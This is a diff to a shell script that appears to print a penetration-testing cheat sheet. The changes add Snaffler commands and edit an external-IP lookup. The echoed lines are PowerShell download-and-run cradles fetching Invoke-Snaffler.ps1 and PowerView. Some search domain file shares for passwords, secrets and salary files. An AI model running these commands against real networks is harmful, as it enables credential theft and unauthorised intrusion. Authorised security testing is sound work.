@@ -386,7 +386,7 @@ echo -ne "
 	
 	
 "
-echo -e "${YELLOW}External IP${RESTORE}" & dig +short myip.opendns.com @resolver1.opendns.com
+echo -e "${YELLOW}External IP${RESTORE}" & curl ifconfig.me
 echo -e ""
 echo -e ""
 echo -e "${YELLOW}Network adapter IPs${RESTORE}" & ip -br addr show
@@ -1935,6 +1935,8 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinde
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -Terms account*,pass*,secret*,conf*,test*,salar*"
 echo -e ""
 echo -e "${IBLUE}Snaffler${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Snaffler.ps1);Invoke-Snaffler -d domain.local"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Snaffler.ps1);Invoke-Snaffler -a -d domain.local"
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Snaffler.ps1);Invoke-Snaffler -Command "\"-s -d Domain.local -o snaffler.log -v data"\""
 echo -e ""
 echo -e ""
